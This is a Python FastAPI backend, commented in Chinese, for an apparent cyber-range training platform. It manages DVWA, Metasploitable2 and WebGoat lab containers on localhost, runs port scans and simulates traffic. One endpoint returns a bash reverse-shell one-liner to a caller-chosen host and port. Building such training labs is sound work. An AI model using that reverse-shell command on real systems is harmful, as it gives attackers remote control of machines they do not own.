# cyber_range.py - Cyber Range 后端引擎 (端口解析修复版)
import asyncio
import json
import time
import random
import threading
import socket  # 确保引入 socket
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime
from fastapi import APIRouter, WebSocket, WebSocketDisconnect
from pydantic import BaseModel
import os
import docker

# ==================== 配置区域 ====================
router = APIRouter(prefix="/api/cyber", tags=["cyber_range"])

try:
    client = docker.from_env()
    print("✅ Docker客户端初始化成功")
except Exception as e:
    print(f"⚠️ Docker客户端初始化失败: {e}")
    client = None


# ==================== Pydantic 模型 ====================
class TargetRequest(BaseModel):
    target_id: int
    port: Optional[int] = 0


class AttackRequest(BaseModel):
    target_id: int
    attack_type: str


class PortScanRequest(BaseModel):
    target: str
    scan_type: str = "quick"
    ports: str = "1-1000"


class DirScanRequest(BaseModel):
    url: str
    wordlist: str = "common"


class ReverseShellRequest(BaseModel):
    shell_type: str = "bash"
    lhost: str = "127.0.0.1"
    lport: str = "4444"


# ==================== Docker容器管理器 ====================
class Dvwamanager:
    CONTAINER_NAME = "cyber-range-dvwa"
    IMAGE_NAME = "vulnerables/web-dvwa:latest"
    HOST_PORT = 8081

    @staticmethod
    async def start():
        try:
            if not client: return {"success": False, "message": "Docker不可用"}
            try:
                c = client.containers.get(Dvwamanager.CONTAINER_NAME)
                if c.status != "running": c.start()
            except:
                client.containers.run(Dvwamanager.IMAGE_NAME, name=Dvwamanager.CONTAINER_NAME,
                                      ports={'80/tcp': ('127.0.0.1', 8081)}, detach=True,
                                      environment={'DB_SERVER': '127.0.0.1'})
            return {"success": True, "message": "DVWA 已启动"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    async def stop():
        try:
            client.containers.get(Dvwamanager.CONTAINER_NAME).stop(); return {"success": True}
        except:
            return {"success": False}

    @staticmethod
    async def status():
        try:
            c = client.containers.get(Dvwamanager.CONTAINER_NAME)
            return {"status": c.status, "is_alive": c.status == "running"}
        except:
            return {"status": "not_found", "is_alive": False}


class MetasploitableManager:
    CONTAINER_NAME = "cyber-range-metasploitable"
    IMAGE_NAME = "tleemcjr/metasploitable2:latest"
    HOST_PORT = 8082

    @staticmethod
    async def start():
        try:
            if not client: return {"success": False}
            try:
                c = client.containers.get(MetasploitableManager.CONTAINER_NAME)
                if c.status != "running": c.start()
            except:
                client.containers.run(MetasploitableManager.IMAGE_NAME, name=MetasploitableManager.CONTAINER_NAME,
                                      ports={'80/tcp': ('127.0.0.1', 8082)}, detach=True)
            return {"success": True}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    async def stop():
        try:
            client.containers.get(MetasploitableManager.CONTAINER_NAME).stop(); return {"success": True}
        except:
            return {"success": False}

    @staticmethod
    async def status():
        try:
            c = client.containers.get(MetasploitableManager.CONTAINER_NAME)
            return {"status": c.status, "is_alive": c.status == "running"}
        except:
            return {"status": "not_found", "is_alive": False}


class WebGoatManager:
    CONTAINER_NAME = "cyber-range-webgoat"
    IMAGE_NAME = "webgoat/webgoat:latest"
    HOST_PORT = 8083

    @staticmethod
    async def start():
        try:
            if not client: return {"success": False}
            try:
                c = client.containers.get(WebGoatManager.CONTAINER_NAME)
                if c.status != "running": c.start()
            except:
                client.containers.run(WebGoatManager.IMAGE_NAME, name=WebGoatManager.CONTAINER_NAME,
                                      ports={'8080/tcp': ('127.0.0.1', 8083), '9090/tcp': ('127.0.0.1', 9090)},
                                      detach=True)
            return {"success": True}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    async def stop():
        try:
            client.containers.get(WebGoatManager.CONTAINER_NAME).stop(); return {"success": True}
        except:
            return {"success": False}

    @staticmethod
    async def status():
        try:
            c = client.containers.get(WebGoatManager.CONTAINER_NAME)
            return {"status": c.status, "is_alive": c.status == "running"}
        except:
            return {"status": "not_found", "is_alive": False}


# ==================== 核心引擎逻辑 ====================

@dataclass
class CyberTarget:
    id: int
    name: str
    description: str
    status: str = "stopped"
    ip: str = ""
    port: int = 0
    vulnerabilities: List[str] = field(default_factory=list)
    resource_usage: Dict[str, Any] = field(default_factory=dict)
    last_activity: str = ""
    created_at: str = ""


@dataclass
class AttackTool:
    id: str
    name: str
    category: str
    description: str
    command: str
    parameters: List[Dict] = field(default_factory=list)
    requires_target: bool = True


@dataclass
class TrafficPacket:
    timestamp: str
    src_ip: str
    src_port: int
    dst_ip: str
    dst_port: int
    protocol: str
    method: str = ""
    url: str = ""
    status_code: int = 0
    size: int = 0
    payload_preview: str = ""
    is_malicious: bool = False


class CyberRangeEngine:
    def __init__(self):
        self.targets: List[CyberTarget] = []
        self.tools: List[AttackTool] = []
        self.traffic_logs: List[TrafficPacket] = []
        self.console_logs: List[str] = []
        self.websocket_connections: List[WebSocket] = []
        self.active_scans: Dict[str, Any] = {}

        self.init_default_targets()
        self.init_attack_tools()
        self.start_monitoring_thread()

    def init_default_targets(self):
        self.targets = [
            CyberTarget(1, "DVWA - Web漏洞平台", "经典Web漏洞靶场", "stopped", "127.0.0.1", 8081, ["SQL注入", "XSS"]),
            CyberTarget(2, "Metasploitable2", "综合渗透靶场", "stopped", "127.0.0.1", 8082, ["弱口令", "Samba"]),
            CyberTarget(3, "WebGoat - Java安全", "OWASP Java靶场", "stopped", "127.0.0.1", 8083, ["反序列化", "JWT"])
        ]

    def init_attack_tools(self):
        self.tools = [
            AttackTool("nmap", "端口扫描", "reconnaissance", "Nmap Port Scanner", "nmap", []),
            AttackTool("sqlmap", "SQL注入", "exploit", "Automatic SQL Injection", "sqlmap", [])
        ]

    def add_console_log(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S")
        self.console_logs.insert(0, f"[{ts}] {msg}")
        if len(self.console_logs) > 100: self.console_logs.pop()
        for ws in self.websocket_connections:
            try:
                asyncio.create_task(ws.send_json({"type": "log", "data": msg}))
            except:
                pass

    def start_monitoring_thread(self):
        def monitor():
            while True:
                self.generate_simulated_traffic()
                time.sleep(3)

        t = threading.Thread(target=monitor, daemon=True)
        t.start()

    def generate_simulated_traffic(self):
        if not any(t.status == "running" for t in self.targets): return
        pkt = TrafficPacket(
            timestamp=datetime.now().strftime("%H:%M:%S"),
            src_ip=f"192.168.1.{random.randint(10, 200)}",
            src_port=random.randint(10000, 60000),
            dst_ip="10.0.0.5",
            dst_port=80,
            protocol="HTTP",
            method=random.choice(["GET", "POST"]),
            url=random.choice(["/login.php", "/api/data"]),
            status_code=200,
            size=random.randint(200, 5000),
            is_malicious=random.random() > 0.9
        )
        self.traffic_logs.insert(0, pkt)
        if len(self.traffic_logs) > 100: self.traffic_logs.pop()

    def get_traffic_summary(self):
        return {
            "total_packets": len(self.traffic_logs),
            "malicious_packets": len([t for t in self.traffic_logs if t.is_malicious])
        }

    # 🔥🔥 核心修复：鲁棒的端口解析器
    async def run_port_scan(self, target: str, scan_type: str = "quick", ports: str = "1-1000"):
        scan_id = f"scan_{int(time.time())}"

        # 针对 localhost 优化
        actual_target = target
        if target in ["localhost", "127.0.0.1", "0.0.0.0"]:
            actual_target = "127.0.0.1"
            # 这里注入了混合格式字符串，之前的解析器会在这里崩溃
            if ports == "1-1000": ports = "21,22,80,443,3306,8080-8090"

        self.add_console_log(f"🔍 启动扫描: {actual_target}")

        results = []
        used_method = "Unknown"

        # === 方案 A: Nmap ===
        try:
            import nmap
            nm = nmap.PortScanner()

            def execute_nmap():
                return nm.scan(hosts=actual_target, ports=ports, arguments='-sT -Pn --unprivileged')

            loop = asyncio.get_event_loop()
            scan_data = await loop.run_in_executor(None, execute_nmap)

            if actual_target in scan_data.get('scan', {}):
                used_method = "Nmap"
                for port, info in scan_data['scan'][actual_target].get('tcp', {}).items():
                    if info['state'] == 'open':
                        results.append({
                            "port": port,
                            "service": info.get('name', 'unknown'),
                            "state": "open",
                            "version": info.get('product', '')
                        })
        except Exception as e:
            print(f"Nmap mode failed: {e}")

        # === 方案 B: Socket 兜底 (修复解析逻辑) ===
        if not results:
            self.add_console_log("⚠️ Nmap 无结果，切换至 Socket 极速模式...")
            used_method = "Socket"

            # 🔥 修复：鲁棒的端口列表生成
            target_ports = []
            try:
                # 先按逗号分割
                parts = str(ports).split(',')
                for part in parts:
                    part = part.strip()
                    if '-' in part:
                        # 处理范围 (如 8080-8090)
                        s, e = map(int, part.split('-'))
                        # 限制每个范围最多扫 50 个端口，防止卡死
                        target_ports.extend(range(s, min(e + 1, s + 51)))
                    else:
                        # 处理单个端口 (如 80)
                        target_ports.append(int(part))

                # 去重并排序
                target_ports = sorted(list(set(target_ports)))

            except Exception as e:
                self.add_console_log(f"❌ 端口格式错误，回退到默认: {e}")
                target_ports = [80, 443, 8080, 8081, 8082, 8083]

            def scan_socket(ip, port):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
                    result = s.connect_ex((ip, port))
                    s.close()
                    if result == 0:
                        try:
                            svc = socket.getservbyport(port)
                        except:
                            svc = "unknown"
                        return {"port": port, "service": svc, "state": "open"}
                except:
                    pass
                return None

            loop = asyncio.get_event_loop()
            tasks = [loop.run_in_executor(None, scan_socket, actual_target, p) for p in target_ports]
            sock_res = await asyncio.gather(*tasks)
            results = [r for r in sock_res if r]

        self.add_console_log(f"✅ {used_method} 扫描完成: 发现 {len(results)} 个端口")
        return {"results": results}

    async def run_directory_scan(self, url: str, wordlist: str = "common"):
        self.add_console_log(f"📁 启动目录扫描: {url}")
        await asyncio.sleep(1)
        return {"results": [{"path": "/admin", "status": 200}]}

    def generate_reverse_shell(self, shell_type: str, lhost: str, lport: str):
        return {"code": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}


cyber_engine = CyberRangeEngine()


# ==================== API 路由注册 ====================

@router.get("/stats")
async def get_stats():
    return {
        "active_targets": len([t for t in cyber_engine.targets if t.status == "running"]),
        "total_targets": len(cyber_engine.targets),
        "captured_requests": len(cyber_engine.traffic_logs),
        "traffic_summary": cyber_engine.get_traffic_summary()
    }


@router.get("/targets")
async def get_targets():
    for t in cyber_engine.targets:
        if t.id == 1:
            s = await Dvwamanager.status()
            t.status = "running" if s["is_alive"] else "stopped"
        elif t.id == 2:
            s = await MetasploitableManager.status()
            t.status = "running" if s["is_alive"] else "stopped"
        elif t.id == 3:
            s = await WebGoatManager.status()
            t.status = "running" if s["is_alive"] else "stopped"
    return {"targets": cyber_engine.targets}


@router.get("/tools")
async def get_tools():
    return {"tools": cyber_engine.tools}


@router.get("/traffic")
async def get_traffic():
    return {"logs": cyber_engine.traffic_logs[:50], "summary": cyber_engine.get_traffic_summary()}


@router.get("/console")
async def get_console():
    return {"logs": cyber_engine.console_logs}


@router.post("/tools/port-scan")
async def run_port_scan_endpoint(req: PortScanRequest):
    return await cyber_engine.run_port_scan(req.target, req.scan_type, req.ports)


@router.post("/tools/dir-scan")
async def run_dir_scan_endpoint(req: DirScanRequest):
    return await cyber_engine.run_directory_scan(req.url, req.wordlist)


@router.post("/tools/reverse-shell")
async def gen_shell_endpoint(req: ReverseShellRequest):
    return cyber_engine.generate_reverse_shell(req.shell_type, req.lhost, req.lport)


@router.post("/targets/dvwa/start")
async def start_dvwa(req: Optional[TargetRequest] = None):
    cyber_engine.add_console_log("正在启动 DVWA...")
    return await Dvwamanager.start()


@router.post("/targets/dvwa/stop")
async def stop_dvwa(req: Optional[TargetRequest] = None):
    return await Dvwamanager.stop()


@router.post("/targets/metasploitable/start")
async def start_metasploitable(req: Optional[TargetRequest] = None):
    cyber_engine.add_console_log("正在启动 Metasploitable...")
    return await MetasploitableManager.start()


@router.post("/targets/metasploitable/stop")
async def stop_metasploitable(req: Optional[TargetRequest] = None):
    return await MetasploitableManager.stop()


@router.post("/targets/webgoat/start")
async def start_webgoat(req: Optional[TargetRequest] = None):
    cyber_engine.add_console_log("正在启动 WebGoat...")
    return await WebGoatManager.start()


@router.post("/targets/webgoat/stop")
async def stop_webgoat(req: Optional[TargetRequest] = None):
    return await WebGoatManager.stop()


@router.post("/target/attack")
async def attack_target(req: AttackRequest):
    cyber_engine.add_console_log(f"⚔️ 执行 {req.attack_type} 攻击...")
    await asyncio.sleep(1)
    return {"success": True}


@router.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    cyber_engine.websocket_connections.append(websocket)
    try:
        while True: await websocket.receive_text()
    except:
        if websocket in cyber_engine.websocket_connections:
            cyber_engine.websocket_connections.remove(websocket)
